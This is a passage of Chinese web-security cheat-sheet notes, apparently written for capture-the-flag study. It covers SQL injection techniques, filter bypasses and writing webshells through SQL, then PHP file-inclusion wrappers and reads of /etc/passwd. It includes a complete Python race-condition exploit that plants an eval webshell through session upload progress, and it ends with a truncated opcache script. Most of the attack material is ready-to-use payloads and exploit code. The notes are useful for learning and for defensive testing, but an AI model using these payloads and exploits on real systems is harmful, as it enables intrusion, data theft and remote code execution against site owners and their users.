    FROM 表1 RIGHT OUTER JOIN 表2 ON 表1.列 = 表2.列

# 子查询
  SELECT id,name FROM test WHERE id = (SELECT id FROM test)

# 多值子查询
  SELECT id,name FROM test WHERE id IN (SELECT id FROM test)

# UNION 联合查询
  SELECT查询语句 UNION SELECT查询语句 进行联合查询，要求列数一致，结果为合集

  example : 
    select version()  # 查看版本是否在5.0以上使用infomation
    SELECT * FROM name WHERE id = 2;  # 特定条件
    SELECT * FROM name ORDER BY id;  # 根据列名排序
    SELECT * FROM name ORDER BY id DESC;  # 降序
    SELECT * FROM name limit 0,2;  # 截取0，2

# 相关函数
  database()  # 显示所有数据库
  version()  # 显示当前版本
  user()  # 显示数据库用户
  group_concat()  # 显示多行查询，括号内输入查询列名

  example :
    SELECT DATABSE()  # 显示数据库

# INFORMATION_SCHEMA 数据库
  SCHEMATA表 -> SCHEMA_NAME列 -> 所有数据库名(包括用户创建)

  TABLES表 -> TABLE_NAME列 -> 所有表名
      |
    TABLE_SCHEMA -> 来自哪个数据库

  COLUMN_NAME列 -> 所有列名
      |
  COLUMNS表 -> TABLE_NAME列 -> 来自哪个表
      |
      TABLE_SCHEMA -> 来自哪个数据库
```

## SQL	注入闭合方式判断 与 注释
```plain
?id=1'
?id=1"
如果两个都错，则为整数型报错

?id=1' and '1'='1
?id=2' and '1'='1  # 判断有没有括号，因为有括号的话整体是1
剩下就是一些加单引号、双引号、括号、大括号，百分号的过程了，大括号和百分号比较少见。

'  单引号闭合
" 双引号闭合
') 单引号 + 括号闭合
") 双引号 + 括号闭合
)) 双括号闭合

# 注释，一般不常用，容易被浏览器识别为标签
```

## SQL	注入类型
### SQL 注入常规流程
```plain
# example
# SQL注入点查找
  输入 ' " /  # 如果sql出错，则可能存在sql注入点  # 字符型注入，需要闭合前部分
  SELECT * FROM users WHERE id = '注入语句1' UNION SELECT ...  # 需要闭合

  输入  AND 1=2 --+  # 判断是否执行SQL语句  # 数字型注入，无需闭合
  SELECT * FROM users WHERE id = 注入语句1 UNION SELECT ...  # 无需闭合

# 查看具体列数
  ?id=1' ORDER BY 列数 --+(注释) 

# 联合注入数据库名
  ?id=-1' UNION SELECT NULL,database(),NULL --+

# 联合注入表名
  ?id=-1' UNION SELECT NULL,TABLE_NAME,NULL FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='security'  --+

# 联合注入列名
  ?id=-1' UNION SELECT NULL,COLUMN_NAME,NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='emails'  --+

  ?id=-1' UNION SELECT NULL,GROUP_CONCAT(COLUMN_NAME),NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='emails'  --+  # GROUP_CONCAT 以列表返回

# 注入数据
  ?id=-1' UNION SELECT NULL,GROUP_CONCAT(email_id),NULL FROM emails --+
```

### 布尔盲注
当查找注入点时，只返回对错，使用布尔盲注，布尔盲注只是在查询语句中使用 length(判断长度) ascii substr(判断字符)

```plain
...
# LENGTH 查看长度
  LENGTH(strings)  # 获取strings长度
  ?id=1'AND LENGTH((SELECT DATABASE()))>9 --+

# IF 判断函数
  IF(判断内容，正确执行，错误执行)

# ASCII 盲注字符
  ASCII(CHR)  # 取ascii值
  SUBSTR(str,pos,len)  # 截取字符串，str字符串，pos截取位置，len截取长度
  ?id=1'AND ASCII(SUBSTR((SELECT DATABASE()),1,1))>1 --+

# 其他盲注姿势
  1.LEFT(STRINGS,POS) 取字符串左边第n个位置
    ?id=1' AND LEFT(DATABASE(),1)='s' --+

  2.LIKE 模糊匹配
    ?id=1' OR DATABASE() LIKE 's_' --+

  3.PEGEXP 模糊匹配
    ?id=1 OR DATABASE() REGEXP '^s' --+

...
每次注入只需更改substr()中的查询语句
```

### 时间盲注
当返回值为一样时，尝试时间盲注，时间盲注具体只是在布尔盲注上加上了 if 判断进行sleep

```plain
# 判断注入点
  ?id=1' AND SLEEP(1) --+
  ?id=1" AND SLEEP(1) --+
  ?id=1') AND SLEEP(1) --+
  ?id=1' AND SLEEP(1) --+
  ?id=1") AND SLEEP(1) --+

# 判断函数
  IF(判断内容，正确执行，错误执行)

# 延时函数
  SLEEP(delay)  # 休眠时间

payload :?id=1'AND IF(LENGTH((SELECT DATABASE()))>9,SLEEP(5),1)--+
```

### 堆叠注入
```plain
原理：存在mysqli_multi_query函数，进行多sql语句执行，或者以sql代码绕过，插入值
  ?id=1'; INSERT INTO table(id, name) VALUES (1, 'a')--+
  ?id=1';show databases;#
```

### 报错注入
```plain
# CONCAT 函数
  CONCAT('a','b') --> 'ab'

# EXTRACTVALUE 函数
  EXTRACTVALUE(XML对象名称,Xpath字符串)
  # 原理
    当查询xml对象中的Xpath字符串时，Xpath字符串语法错误，直接显示报错信息，报错信息中返回了Xpath字符串，当该字符串写入sql语句时，返回的sql信息
    ?id=1' AND (EXTRACTVALUE(0,CONCAT(0x7e,(sql语句))) --+
    ?id=1' AND (EXTRACTVALUE(0,CONCAT(0x7e,(select database()))) --+

# UPDATEXML 函数
  UPDATEXML(XML对象名称,Xpath格式指定字符串,替换字符)
  # 原理
    当查询xml对象中的Xpath字符串时，Xpath字符串语法错误，直接显示报错信息，报错信息中返回了Xpath字符串，当该字符串写入sql语句时，返回的sql信息
    ?id=1' AND (UPDATEXML(0,CONCAT(0x7e,(sql语句),0x7e),0)) --+
    ?id=1' AND (UPDATEXML(0,CONCAT(0x7e,(SELECT DATABASE()),0x7e),0)) --+

# FLOOR 函数
  RAND(0) 取固定随机数，FLOOR(RAND(0)*2)  # 返回括号内小于最大的整数值
  GROUP BY() 按照括号内容进行分组 COUNT(*)  # 返回括号内容的统计次数
  # 原理：
    select count(*),floor(rand(0)*2) x from table group by x --+
    报错Duplicate entry '值' for key '字段名'
    ?id=1' UNION SELECT COUNT(*),CONCAT(FLOOR(RAND(0)**2),DATABASE()) X FROM INFORMATION_SCHEMA.SCHEMATA GROUP BY X --+
    ?id=1' UNION SELECT COUNT(*),CONCAT(FLOOR(RAND(0)**2),SELECT CONCAT(TABLE_NAME)FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='' LIMIT 0,1) X FROM INFORMATION_SCHEMA.SCHEMATE GROUP BY X --+
```

### update注入
```plain
# update注入原理：
通过sql注入的update函数将所有值更新
  ';update users set age=$_POST[age],nickname='$_POST[nickname]' # 设置全部
  ';update users set age=$_POST[age],nickname='',passwd='' where id = '' 
```

### union select伪造
```plain
# 伪造绕过原理
  当union select查询不存在的数值时，会临时创建虚拟数据
  
  例如：select * from user where username = name=1 union select 1,'admin','c4ca4238a0b923820dcc509a6f75849b'，数据库列表中会创建 admin 和 c4ca4238a0b923820dcc509a6f75849b

  然后搭配传入的密码进行绕过：
  name='union select 1,'admin','21232f297a57a5a743894a0e4a801fc3'# &pw=admin
  创建的虚拟数据与pw传入的密码的md5值相同，达成绕过
```

### quine注入
注入效果：查询的代码和查询结果相同

```plain
# 注入原理：
  替换语句：replace(".",char(46),".") 
  输出结果：.

  替换语句：replace('replace(".",char(46),".")',char(46),'replace(".",char(46),".")')
  输出结果：replace("replace(".",char(46),".")",char(46),"replace(".",char(46),".")")
  通过替换后输出结果还是自己，即自己替换自己，但是就是符号不同，还需要绕过达成符号相同

# 改进replace语句
  替换语句：REPLACE(REPLACE("间隔符",CHAR(34),CHAR(39)),编码的间隔符,"间隔符")
  输出结果：REPLACE(REPLACE('间隔符',CHAR(34),CHAR(39)),编码的间隔符,'间隔符')

  比如
  替换语句：REPLACE( REPLACE(".",CHAR(34),CHAR(39)) ,char(46),".")
  输出结果：.

  尝试根据 . 进行套娃
  replace(replace('replace(replace(".",char(34),char(39)),char(46),".")',char(34),char(39)),char(46),'replace(replace(".",char(34),char(39)),char(46),".")')
  username=bilala&passwd=' union select replace(replace('" union select replace(replace("%",0x22,0x27),0x25,"%")#',0x22,0x27),0x25,'" union select replace(replace("%",0x22,0x27),0x25,"%")#')#
```

### SQL 注入挂马
```plain
# sqlmap --os-shell
  传入两个php，一个用于udf提权，一个用于命令执行

# 查看函数是否被禁用
  SHOW VARIABLES
  show VARIABLES like 'secure%'
  show VARIABLES like '%secure%'
  show global variables like "secure_file_priv"; 如果 secure_file_priv 为 NULL 则无法挂马

# 读取文件
  # load_file()
    load_file(file_name)

  # load data infile
    LOAD DATA INFILE 'file_path'

# 写入文件
  # INTO OUTFILE 写入文本文件到本地
    UNION SELECT "" INTO OUTFILE ""; // 直接输出，多行输出
    UNION SELECT  "字段1","字段2" INTO OUTFILE "绝对路径"

  # INTO DUMPFILE 写入二进制文件到本地
    UNION SELECT "" INTO DUMPFILE ""; // 二进制文件，单行输出
    UNION SELECT  unhex("16进制编码") INTO DUMPFILE "绝对路径" 

# 日志挂马
  通过将日志写入日志文件进行挂马，只需要文件后缀为 php 且执行日志内容有一句换木马即可
  
```

### SQL 预编译防注入原理
```plain
词法分析：将SQL语句分解成一个个token（关键字、标识符、运算符），然后对token进行分类和解析，生成相应的数据结构。
语法分析：根据SQL语法检测规则检查语法是否正确，并成成语法树。
语义分析：遍历语法树，确定表和列等信息，同时检查语义的正确性。
优化处理：使用优化器对SQL语句进行处理和优化，比如执行计划、索引等。
执行计划：使用执行计划生成器生成SQL语句的执行计划，比如数据的访问方式，索引的使用方式等。
引擎执行：将执行计划发送给相应的数据库引擎进行处理，执行计划被翻译成底层的操作指令，执行数据扫描、索引查找、排序、分组等操作。
返回数据：将执行结果返回给客户端，比如查询结果集或操作结果。

当使用预编译时，会被占位符先替代
例如 id={ID} 在执行时会先被 ？ 占位符替代
此时，SQL语句结构已经确定
而再使用 'union select 时，无法改变结构与前面'闭合为新的SQL语句，而是类似参数化，达成防SQL注入效果
```

## SQL 注入绕过
### 二次注入
```plain
当有时候过滤十分严格，闭合不上，尝试二次注入
例如：注册一个用户名 test' 密码为sql 语句，即可绕过过滤问题
```

### 宽字节注入（绕过 \ 转义）
```plain
宽字节绕过，如果语句中含有 mysql_query("SET NAMES 'gbk'")，set character_set_client=gbk，使用宽字节即可绕过
原理：有些waf过滤'会将其转义，addslashes转义后 %df 与 \即%5c 符号GBK解码时，会被解析成 df5c 中文字符
```

### 双查询注入
```plain
过滤十分严格时可尝试
原理：?id=1 && id=2 传递两个参数，网页只识别一个，另一个绕过
?id=1&&id=0' union select null,database(),null --+
```

### SQL 注入内容绕过
<!-- 这是一张图片，ocr 内容为：536BYTES/143MS 构造请求 美化 HEX 精加我 迪染 美化 HEX 实物拍摄 链牌 HTTPS POST./1Y/ADNIN/1OEIN.PHP7TYPE-2-HTTP/1.1 HOST:WWW.GLDHN.TOP WARNING:UNDEFINED ARRAY KEY'UPACC"IN/WWW/WWWROOT/WWWW.GLDHN.TOP/LY, CONNECTION:-KEEP-ALIVE DMIN/LOGIN.PHP ON LINE 71 CONTENT-LENGTH AUTO 1-36 CECHE-CONTROL:MEX-EGE-0 FATAL ERROR. UNCAUGHT MYSQLI SQL EXCEPTION:FUNCTION SQL WWW GLDHN TOLDHN TOLOADFILE DOES NOT IN SEC-CH-UA!--MICROSOFT-EDGE"IV*141","NOT7A BRAND'IV*"8","CHRONIUN"IV"IV""141" /WWW/WWWROOT/WWW.GLDHN.TOP/LY/ADMIN/LOGIN.PHP:11 STACK TRACE:#O SEC-CH-UA-MOBILE:20 SEC-CH-UA-PLATFORN:"HINDOWS /WWW/WWWROOT/WWW.GLDHN.TOP/LY/ADMIN/LOGIN.PHP(1111 QUERYO #1 ORIGIN:HTTPS://WIW.GLDHN.TOP /WWW/WWWROOT/WWW.GLDHN.TOP/LY/ADMIN/LOGIN.PHP(74):LOGINO #2 (MAIN)THROWN IN CONTENT-TYPE: APPLICATION/X-IANU-FORN-URLENCODED /WWW/WWWROOT/WWW.GLDHN.TOP/LY/ADMIN/LOGIN.PHP ON LINE 11 141.0.0.0 ACCERT;TEXT/HTAL,  RODLCATIONJ/YNABE/ENL,3POILCATIONJZHIGNTIONL,3G-S,APERMEBERMEBERMS,4POILCATION SIGNED-EXCHONGEJVB3JQ-0.7 5EC-FETCH-5ITE:SANE-ORIGIN SEC-FETCH-NODE:NAVIGATE SEC-FETCH-USER:21 SEC-FETCH-DESTI-DOCUNENT AECERERTODSOLLTARL/GYG.DANISELETEDEINDEINL ACCEPT-LANGUAGE:-ZH-CN,ZHJQ-ENJQ-ENJQ-0.......... . . . .... (OOKIE;-NAME-<BYNE;;PHP555555530-TAPL3IGNBJUPPEJPHURL; TH JVT-31638-17619526262626EA863863S-176193133 HPNACCOUNT-66312FBA86A28SC9; HL IPVT_C31439562F055E35E3082BEDEABCCABB38-1761931913 USERNSEE-TEST133SS' ND (URDATE3D'),CNCAT(EX73,(SELCCT   LASDFIL:( /ETC/PASSUD'),AXLE),O)),-+SPESSUORI -->
![](https://cdn.nlark.com/yuque/0/2025/png/35229002/1761935439461-961f412d-07cd-44ff-a978-8e3ee6fb6ff7.png)

用错误的函数报错引出数据库名

```plain
# 逻辑符号绕过
  or = ||
  and = &&
  xor = | ^
  not = !

# 空格绕过
  if(ascii(substr((select(flag)from(flag)),{0},1))={1},1,2)  # 其他方法
  /**/
  ()
  +
  space: %20 
  tab: %09
  LF: %0a
  FF: %0c
  CR: #0d
  VT: %0b
  -OA-(MySQL): %a0
  `
  两空格

# 引号添加反斜杠绕过
  %df 宽字节注入
  CHAR() 例如：table_name=char(1,2,3)
  hex 例如：table_name=0x732321392

# 字符绕过
  CHAR() 例如：table_name=char(1,2,3)
  hex 例如：table_name=0x732321392

# 大于号小于号绕过
  between关键字 between 1 and 2
  in关键字 in(1,2)

# =过滤
  >0 and <2 等于1
  <> 等于 !
  like
  正则匹配

# 逗号绕过
  比如 substr(string,0,1) 逗号被过滤
  substr(string(0from1for1))
  mid(database(0from1for1))

# 比较符绕过
  greatest(min,max)

# 关键字过滤
  # 等效函数绕过
    select绕过可以使用handler
    1.handler table_name open // 打开table句柄
    2.handler table_name read index_name{> < = >= <=}[where where_condition][limit] // 通过索引查看表
    3.handler table_name read index_name[first next prev last][where where_condition][limit] // 通过条件查看表 first第一行，last最后一行，next下一行，prev上一行
    4.handler table_name read {first next}[where where_condition][limit] // 不通过索引查看下一行，read first获取第一行，read next 依次获取下一行
    5.handler table_name close // 关闭句柄

  # 存储过程代码绕过
    Set @sql=concat("s","elect flag from `1919810931114514`"); // 建立sql语句
    PREPARE sqla from @sql; // PREPARE 预编译执行
    EXECUTE sqla; // 输出
    
  # 大小写绕过
    SelECT

  # 双写绕过
    selselectect

  # 内联注释绕过
    sel/**/ect

  # 如URLEncode编码，ASCII,HEX,unicode编码绕过
    or1=1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。

  # 等价函数
    hex() bin() --> ascii()
    sleep() --> benchmark()  # 指定次数表达式，造成延迟
    concat_ws() --> group_concat()
    mid() substr() --> substring()
    @@user --> user()
    
  # 截断
    LEFT(string,pos)
    RIGHT(string,pos)
    MID(string,pos_start,pos_end)
    SUBSTR(string,pos_start,pos_end)
    SUBSTRING_INDEX(string,关键字,第n个关键字)  # 截取第n个关键字后所有信息

  # 其他盲注姿势
    1.LEFT(STRINGS,POS) 取字符串左边第n个位置
      ?id=1' AND LEFT(DATABASE(),1)='s' --+
    2.LIKE 模糊匹配
      ?id=1' OR DATABASE() LIKE 's%' --+
      
    3.PEGEXP 模糊匹配
      ?id=1 OR DATABASE() REGEXP '^s' --+
  
# 以上方法均不行时进行条件竞争
```

# 文件包含
## 文件包含 常用包含函数 和 伪协议
```plain
# 只要文件能被包含以及被读取，即可执行文件包含
  include()
  include_once()
  require()
  require_once()
  highlight_file()
  show_source()
  readfile()
  file_get_contents()
  fopen()
  file()

# 伪协议
?file = 文件包含代码
  php.ini 中
  allow_url_fopen = On（是否允许打开远程文件）
  allow_url_include = On（是否允许include/require远程文件）

# file协议
  file:/// # file://绝对路径 访问本地文件 且不受allow_url_fopen与allow_url_include的影响。
  file:///etc/passwd  

# php协议
  php://input # 将POST内容作为php代码运行，可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行；需要开启allow_url_include=on，对allow_url_fopen不做要求。
  php://filter 类似readfile() file() file_get_contents() 只是读取，所以只需要开启allow_url_fopen，对allow_url_include不做要求。
  php://filter/read=convert.base64-encode/resource=文件名字
  php://filter/write=convert.base64-encode/resource=文件名字

# data://命令执行allow_url_fopen参数与allow_url_include都需开启。
  data:text/plain,text
  data:text/plain,<?php system('command')?>
  data:text/plain;base64,PD9waHAgc3lzdGVtKCdjb21tYW5kJyk/Pg==

# zip://,bzip2://,zlib:// 类似gzopen bzopen 打开文档
  payload: ?page=zip://[压缩文件路径]#[压缩文件内的子文件名]
  payload: ?page=zip://[压缩文件路径]%23[压缩文件内的子文件名] #可能无法被编译
  zlib://file.gz
  bzip2://file.bz2
  zip://archive.zip#dir/file.txt

# phar:// 解压文档 和 phar反序列化
  payload:?page=phar://[压缩文件路径]/[压缩文件内的子文件名]
  index.php?file=phar://D:/1.zip/1.php

# compress.zilb://
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1734696645116-3a9ec626-7c7d-4427-a78e-a8bb90ffe3ad.png)

## 文件包含 绕过
文件并不一定要以 php 结尾，只要能被包含即可被执行

搭配文件上传绕过，文件上传一个写入php的shell脚本，然后文件包含shell

```plain
<?php $file = fopen("a.php","w");fputs($file,'<?php @eval($_REQUEST[666]);?>')?>
?666=phpinfo()
```

文件包含的主要绕过也是因为服务器包含文件的时候，会include($filename,'.php')之类的方法，绕过时只需要include(恶意代码文件)，从而需要想办法将后面的 其他后缀截断

```plain
# 内容绕过 双重编码
  php://filter/convert.%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%35%25%36%65%25%36%33%25%36%66%25%36%34%25%36%35/resource=index.php

# 死亡die函数
  结构：file_put_data(<?php die();?>.inputdata)
  绕过原理：file_put_data 协议通过 base64转换文件内容，将输入文件内容通过 base64 解码，让die函数通过base64解码，显然是乱码达成绕过

  方法2：去除标签
  php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php
  
# session.upload_progress 文件包含（条件竞争）exp
  条件竞争原理：高速发信，让服务器响应不过来从而绕过读取检测

# 注意 
  文件就算不是php，只要能被包含，就能被包含成代码执行
  一般通过截断后缀名防止被包含成其他文件 比如 flag.php 被包含时变成 flag.php.php 服务器上无此文件

# %00截断绕过
  .php%00

# 路径长度绕过
  windows目录最大长度为256字节，超出部分会被丢弃
  linux目录最大长度为4096字节，超出部分会被丢弃
  payload:http://192.168.100.150/test_include/index.php?page=1.png/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././

# 点号截断
  windows点号最大长度为256字节，超出部分会被丢弃
  linux点号最大长度为4096字节，超出部分会被丢弃

# 双写绕过
  如果服务器是将关键字替换为空时候，可以尝试双写绕过

# 大小写混合绕过
  如果没有进行严格过滤可以尝试此方法

# 其他符号绕过
  需要爆破截断字符

# CWD临时文件路径绕过 仅限 require_once 和 include_once，可以理解为过长会被抛弃
  即 /proc/self
  php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php

# 远程文件包含
  如果文件包含能包含远程文件，那就可以试试远程文件包含

# 日志文件包含（修改user-agent包含）一般使用getshell
  <?include"/var/log/nginx/access.log"?>
  file=/var/log/nginx/access.log #nginx常见日志路径
  file=/var/log/nginx/error.log #包含日志文件getshell

# session 文件包含 推荐 session.upload_progress 
  Cookie: PHPSESSID=223 则 sess_PHPSESSID = sess_223
  /var/sessions/sess_PHPSESSID
  /tmp/sessions/sess_PHPSESSID
  /var/lib/php/sess_PHPSESSID
  /var/lib/php/sessions/sess_PHPSESSID
  /tmp/sess_PHPSESSID
```

## filter_chain 绕过
php_filter_chain_generator 生成超长任意文件构建

```plain
适用情况：
  file_get_contents 进行文件包含时，对文件内容校验
  php_filter_chain_generator.py 可以对内容进行多次编码，不同编码的字符特性不同，编码和解编码会多字符或者少字符，可以达成任意字符构造
  对于获取文件的内容：在代码之修改目标文件
```

## 文件包含 session.upload_progress 条件竞争
[https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html)

```plain
在phpinfo.php查看
session.upload_progress.enabled = on # 可以控制是否开启session.upload_progress功能
session.upload_progress.cleanup = on # 可以控制是否在上传之后删除文件内容
session.upload_progress.prefix = "upload_progress_" # 可以设置上传文件内容的前缀
session.upload_progress.name = "PHP_SESSION_UPLOAD_PROGRESS" # 值即为session中的键值
```

存在 session 文件上传，在phpinfo.php 进行上传，以下为测试视频

```python
import threading
import requests
from concurrent.futures import ThreadPoolExecutor, wait

target = 'http://192.168.1.162:8080/index.php'
session = requests.session()
flag = 'helloworld'


def upload(e: threading.Event):
    files = [
        ('file', ('load.png', b'a' * 40960, 'image/png')),
    ]
    data = {'PHP_SESSION_UPLOAD_PROGRESS': rf'''<?php file_put_contents('/tmp/success', '<?=phpinfo()?>'); echo('{flag}'); ?>'''}

    while not e.is_set():
        requests.post(
            target,
            data=data,
            files=files,
            cookies={'PHPSESSID': flag},
        )


def write(e: threading.Event):
    while not e.is_set():
        response = requests.get(
            f'{target}?file=/tmp/sess_{flag}',
        )

        if flag.encode() in response.content:
            e.set()


if __name__ == '__main__':
    futures = []
    event = threading.Event()
    pool = ThreadPoolExecutor(15)
    for i in range(10):
        futures.append(pool.submit(upload, event))

    for i in range(5):
        futures.append(pool.submit(write, event))

    wait(futures)
```

会创建

```plain
upload_progress_<?php eval($_POST[1]);?>|a:5:{s:10:"start_time";i:1631343214;s:14:"content_length";i:276;s:15:"bytes_processed";i:276;s:4:"done";b:0;s:5:"files";a:1:{i:0;a:7:{s:10:"field_name";s:4:"file";s:4:"name";s:8:"Lxxx.jpg";s:8:"tmp_name";N;s:5:"error";i:0;s:4:"done";b:0;s:10:"start_time";i:1631343214;s:15:"bytes_processed";i:276;}}}

# 第一个部分
  upload_progress_<?php eval($_POST[1]);?>
  这一块内容由以下两个值组成：session.upload_progress.name+PHP_SESSION_UPLOAD_PROGRESS

# 第二部分
  a:5:{s:10:"start_time";i:1631343214;s:14:"content_length";i:276;s:15:"bytes_processed";i:276;s:4:"done";b:0;s:5:"files";a:1:{i:0;a:7:{s:10:"field_name";s:4:"file";s:4:"name";s:8:"Lxxx.jpg";s:8:"tmp_name";N;s:5:"error";i:0;s:4:"done";b:0;s:10:"start_time";i:1631343214;s:15:"bytes_processed";i:276;}}}
  一看就是序列化之后的值，我们将其进行反序列化后输出：

  array(5) {
  ["start_time"]=>
  int(1631343214)
  ["content_length"]=>
  int(276)
  ["bytes_processed"]=>
  int(276)
  ["done"]=>
  bool(false)
  ["files"]=>
  array(1) {
    [0]=>
    array(7) {
      ["field_name"]=>
      string(4) "file"
      ["name"]=>
      string(8) "Lxxx.jpg"
      ["tmp_name"]=>
      NULL
      ["error"]=>
      int(0)
      ["done"]=>
      bool(false)
      ["start_time"]=>
      int(1631343214)
      ["bytes_processed"]=>
      int(276)
    }
  }
  }
  可以看到这里记录了文件上传时间、文件大小、文件名称等等文件属性。
```

然后只需要条件竞争去文件包含内容

```plain
# 原理：session.upload_progress 开启后可以通过session 传输文件，可以通过 phpinfo 或者 php.ini 查看到是否开启，以及目录
data={
  'PHP_SESSION_UPLOAD_PROGRESS': '<?php eval($_POST["cmd"]);?>'}, 
  files={
    'file': ('tgao.txt',f)
    }, 
  cookies={'PHPSESSID': sessid}
```

完整exp：

```python
import requests
from re import findall as re_findall
from base64 import b64encode
from threading import Thread

HOST = 'http://node4.anna.nssctf.cn:28616/'
PHPINFO_URL = HOST + 'phpinfo.php'
LFI_URL = HOST + 'index.php'
WEB_SHELL = b'<?php eval($_POST[cmd]);?>'


session_configures = {}
resp_text = re_findall('<td class="e">session\.(.*?)</td><td class="v">(.*?)</td>', requests.get(PHPINFO_URL).text)
list(map(lambda x : session_configures.update({x[0] : x[1]}), resp_text))
if session_configures['upload_progress.enabled'] != 'On':
    print('[-] Target is not vulnerable')
    exit(-1)

success = False

def request_phpinfo():
    exploit = f"<?php file_put_contents('/tmp/.shell.php', base64_decode('{b64encode(WEB_SHELL).decode()}')); echo md5('ccc');?>"
    data = {session_configures['upload_progress.name'] : exploit}
    cookies = {'PHPSESSID' : 'c'}
    files = {'files' : ('hello.txt', b'A' * 1024 * 1024)}
    while not success:
        requests.post(PHPINFO_URL, data=data, cookies=cookies, files=files)

def request_sess_file():
    global success
    data = {'file' : session_configures['save_path'] + '/sess_c'}
    while not success:
        resp = requests.get(LFI_URL, params=data)
        if '9df62e693988eb4e1e1444ece0578579' in resp.text:
            print('[+] The webshell was successfully written to /tmp/.shell.php')
            success = True

Thread(target=request_phpinfo).start()
Thread(target=request_sess_file).start()
```

## PHP-0817
```php
<?if(intval($num,0) == 2024){
        if (isset($_GET['which'])){
            $which = $_GET['which'];
            switch ($which){
                case 0:
                    print('QAQ');
                case 1:
                case 2:
                    require_once $which.'.php';
                    echo $flag;
                    break;
                default:
                    echo GWF_HTML::error('PHP-0817', 'Hacker NoNoNo!', false);
                    break;
            }
        }
    } 

# 可以自定义传参 which ，还暂未调试，貌似是可以跳转所有 which
```

## CVE-2024-2961 RCE
## OPCACHE upload
<!-- 这是一张图片，ocr 内容为：ZEND OPCACHE OPCODE CACHING UP AND RUNNING OPTIMIZATION ENABLED SHM CACHE DISABLED FILE CACHE ENABLED OK STARTUP DIRECTIVE MASTER VALUE LOCAL VALUE NO VALUE NO VALUE OPCACHE.BLACKLIST_FILENAME 0 0 OPCACHE.CONSISTENCY CHECKS OFF OFF OPCACHE.DUPS FIX ON OPCACHE.ENABLE ON OFF OFF OPCACHE.ENABLE_CLI OFF OFF OPCACHE.ENABLE_FILE_OVERRIDE OPCACHE.ERROR_LOG NOVALUE NO VALUE 0 0 OPCACHE.FAST_SHUTDOWN OPCACHE.FILE_CACHE /VAR/WWW/HTML/OPCACHE /VAR/WWW/HTML/OPCACHE OPCACHE.FILE_CACHE_CONSISTENCY_CHECKS 1 OPCACHE.FILE_CACHE_ONLY 1 2 2 OPCACHE.FILE_UPDATE_PROTECTION OPCACHE.FORCE RESTART_TIMEOUT 180 180 OFF OFF OPCACHE.HUGE_CODE_PAGES ON ON OPCACHE.INHERITED HACK 4 4 OPCACHE.INTERNED_STRINGS_BUFFER /TMP /TMP OPCACHE.LOCKFILE_PATH 1 1 OPCACHE.LOG_VERBOSITY_LEVEL 2000 2000 OPCACHE.MAX ACCELERATED FILES -->
![](https://cdn.nlark.com/yuque/0/2026/png/35229002/1780595872017-6c2912d6-4a40-41a3-b1a3-3f0b6d21e6e5.png)

如果开启了，则 opcache 目录下有 /var/www/html/opcache/0b8bd94e9858e5d32d058dc0acf75014/var/www/html/index.php.bin



php7 生成逻辑，结合 phpinfo 生成 systemid

```plain
#!/usr/bin/env python3

# Copyright (c) 2016, 2019 GoSecure Inc.
# Converted to Python 3

import sys
import re
import hashlib
from packaging import version

def md5(data):
    if isinstance(data, str):
        data = data.encode('utf-8')
    return hashlib.md5(data).hexdigest()

def main():
    if len(sys.argv) < 2:
        print(f"{sys.argv[0]} [file|URL]")
        sys.exit(1)

    target = sys.argv[1]

    if target.startswith("http"):
        import requests
        text = requests.get(target).text
    else:
        with open(target, 'r', encoding='utf-8', errors='replace') as f:
            text = f.read()

    # PHP Version — try the <tr>/<td> pattern first, then the <h1> fallback
    php_version = re.search(
        r'<tr><td class="e">PHP Version </td><td class="v">(.*?)</td></tr>',
        text
    )

    if php_version is None:
        php_version = re.search(
            r'<h1 class="p">PHP Version (.*?)</h1>',
            text
        )

    if php_version is None:
        print("No PHP version found, is this a phpinfo file?")
        sys.exit(1)

    php_version = php_version.group(1).strip()
    php_greater_74 = (version.parse("7.4.0") <
                      version.parse(php_version.split("-")[0]))

    # Zend Extension Build ID
    zend_extension_id = re.search(
        r'<tr><td class="e">Zend Extension Build </td><td class="v">(.*?)</td></tr>',
        text
    )
    if zend_extension_id is None:
        print("No Zend Extension Build found.")
        sys.exit(1)
    zend_extension_id = zend_extension_id.group(1).strip()

    # Architecture
    architecture = re.search(
        r'<tr><td class="e">System </td><td class="v">(.*?)</td></tr>',
        text
    )
    if architecture is None:
        print("No System info found.")
        sys.exit(1)
    architecture = architecture.group(1).strip().split()[-1]

    # Zend Bin ID suffix
    if architecture == "x86_64":
        bin_id_suffix = "48888"
    else:
        bin_id_suffix = "44444"

    # With PHP 7.4 they fixed the undefined macro that did the weird bin ID
    if php_greater_74:
